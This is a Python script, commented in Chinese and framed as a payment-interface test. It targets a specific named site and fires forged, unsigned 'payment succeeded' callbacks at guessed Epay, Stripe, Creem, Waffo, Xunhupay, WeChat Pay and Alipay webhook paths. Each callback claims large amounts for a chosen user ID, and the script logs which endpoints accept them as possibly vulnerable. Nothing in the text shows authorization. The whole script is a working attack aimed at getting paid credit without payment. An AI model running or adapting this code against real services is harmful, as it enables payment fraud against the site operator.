#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
timyai.com 全面的支付接口测试
"""

import requests
import json
import time
import random
import string

TARGET_URL = "http://timyai.com"

class TimyaiPaymentTest:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
        })
    
    def generate_order_no(self, user_id=999):
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        return f"SUBUSR{user_id}NO{random_str}{int(time.time())}"
    
    def test_all_payment_endpoints(self):
        """测试所有支付相关端点"""
        print("="*60)
        print("timyai.com 支付接口全面测试")
        print("="*60)
        
        results = {}
        
        # 1. 易支付回调
        print("\n>>> 1. 易支付回调测试 <<<")
        epay_params = {
            "trade_no": self.generate_order_no(999),
            "status": "success",
            "amount": "500.00",
            "param": "user_id_999",
            "time": str(int(time.time())),
            "type": "alipay",
        }
        
        epay_endpoints = [
            "/api/user/epay/notify",
            "/api/subscription/epay/notify",
            "/api/epay/notify",
            "/epay/notify",
            "/pay/epay/notify",
        ]
        
        for endpoint in epay_endpoints:
            print(f"\n  {endpoint}:")
            for method in ["GET", "POST"]:
                try:
                    url = f"{TARGET_URL}{endpoint}"
                    if method == "GET":
                        r = self.session.get(url, params=epay_params, timeout=10)
                    else:
                        r = self.session.post(url, data=epay_params, timeout=10)
                    
                    print(f"    {method}: 状态={r.status_code}, 响应={r.text[:50]}")
                    results[f"{method} {endpoint}"] = r.status_code
                except Exception as e:
                    print(f"    {method}: 错误 - {str(e)[:50]}")
                    results[f"{method} {endpoint}"] = "error"
        
        # 2. Stripe Webhook
        print("\n>>> 2. Stripe Webhook 测试 <<<")
        stripe_event = {
            "id": f"evt_{int(time.time())}",
            "type": "charge.succeeded",
            "data": {
                "object": {
                    "amount": 50000,
                    "status": "succeeded",
                    "metadata": {"user_id": "999"}
                }
            }
        }
        
        stripe_endpoints = [
            "/api/stripe/webhook",
            "/stripe/webhook",
            "/webhook/stripe",
        ]
        
        for endpoint in stripe_endpoints:
            try:
                url = f"{TARGET_URL}{endpoint}"
                r = self.session.post(url, json=stripe_event, timeout=10)
                print(f"  {endpoint}: 状态={r.status_code}, 响应={r.text[:100]}")
                results[f"POST {endpoint}"] = r.status_code
            except Exception as e:
                print(f"  {endpoint}: 错误 - {str(e)[:50]}")
                results[f"POST {endpoint}"] = "error"
        
        # 3. Creem Webhook
        print("\n>>> 3. Creem Webhook 测试 <<<")
        creem_event = {"event": "payment_succeeded", "data": {"amount": 5000}}
        
        creem_endpoints = [
            "/api/creem/webhook",
            "/creem/webhook",
        ]
        
        for endpoint in creem_endpoints:
            try:
                url = f"{TARGET_URL}{endpoint}"
                r = self.session.post(url, json=creem_event, timeout=10)
                print(f"  {endpoint}: 状态={r.status_code}, 响应={r.text[:100]}")
                results[f"POST {endpoint}"] = r.status_code
            except Exception as e:
                print(f"  {endpoint}: 错误 - {str(e)[:50]}")
                results[f"POST {endpoint}"] = "error"
        
        # 4. Waffo Webhook
        print("\n>>> 4. Waffo Webhook 测试 <<<")
        waffo_endpoints = [
            "/api/waffo/webhook",
            "/waffo/webhook",
        ]
        
        for endpoint in waffo_endpoints:
            try:
                url = f"{TARGET_URL}{endpoint}"
                r = self.session.post(url, json={"event": "payment"}, timeout=10)
                print(f"  {endpoint}: 状态={r.status_code}, 响应={r.text[:100]}")
                results[f"POST {endpoint}"] = r.status_code
            except Exception as e:
                print(f"  {endpoint}: 错误 - {str(e)[:50]}")
                results[f"POST {endpoint}"] = "error"
        
        # 5. 虎皮椒/微信/支付宝
        print("\n>>> 5. 虎皮椒/微信/支付宝测试 <<<")
        cn_endpoints = [
            "/api/xunhupay/notify",
            "/xunhupay/notify",
            "/api/wxpay/notify",
            "/wxpay/notify",
            "/api/alipay/notify",
            "/alipay/notify",
            "/api/wechat/notify",
        ]
        
        cn_params = {
            "trade_order_id": self.generate_order_no(999),
            "status": "OD",
            "total_fee": "500.00",
            "pay_type": "alipay",
        }
        
        for endpoint in cn_endpoints:
            try:
                url = f"{TARGET_URL}{endpoint}"
                r = self.session.post(url, data=cn_params, timeout=10)
                print(f"  {endpoint}: 状态={r.status_code}, 响应={r.text[:100]}")
                results[f"POST {endpoint}"] = r.status_code
            except Exception as e:
                print(f"  {endpoint}: 错误 - {str(e)[:50]}")
                results[f"POST {endpoint}"] = "error"
        
        # 总结
        print("\n" + "="*60)
        print("测试总结")
        print("="*60)
        
        accessible = {k: v for k, v in results.items() if isinstance(v, int) and v not in [502, "error"]}
        vulnerable = {k: v for k, v in results.items() if v == 200}
        
        print(f"\n可访问的端点: {len(accessible)}")
        print(f"可能存在漏洞的端点(返回200): {len(vulnerable)}")
        
        if accessible:
            print("\n可访问的端点详情:")
            for k, v in accessible.items():
                print(f"  {k}: {v}")
        
        if vulnerable:
            print("\n⚠️  可能存在漏洞的端点:")
            for k in vulnerable.keys():
                print(f"  {k}")
        
        return results


if __name__ == "__main__":
    test = TimyaiPaymentTest()
    results = test.test_all_payment_endpoints()
    
    with open("timyai_full_results.json", "w") as f:
        json.dump(results, f, indent=2)